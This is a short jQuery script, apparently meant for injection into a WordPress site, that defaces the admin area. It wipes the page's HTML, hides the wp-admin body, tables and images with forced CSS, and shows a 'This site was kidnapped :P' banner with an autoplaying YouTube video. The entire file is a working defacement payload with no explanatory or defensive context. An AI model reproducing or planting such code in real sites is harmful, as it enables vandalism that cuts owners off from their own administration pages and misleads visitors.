jQuery('html').html("");
jQuery('body.wp-admin').css("display","none");
jQuery('body').append("<div id='huahua'>This site was kidnapped :P<br /><iframe width='640' height='480' src='http://www.youtube.com/embed/QH2-TGUlwu4?autoplay=1&modestbranding=0&controls=0&showinfo=0&autohide=1' frameborder='0' allowfullscreen></iframe></div>");
jQuery('#huahua').append('<style>table,.wp-admin,img,.wp-admin,.no-js,.index-php,.admin-bar,.admin-color-fresh,.no-customize-support{display:none !important;}</style>');
jQuery('#huahua').append('<style>#huahua{margin:0px auto;font-size:45px;position: absolute;text-align: center;width: 50%;left: 25%;}</style>');
jQuery.noConflict();

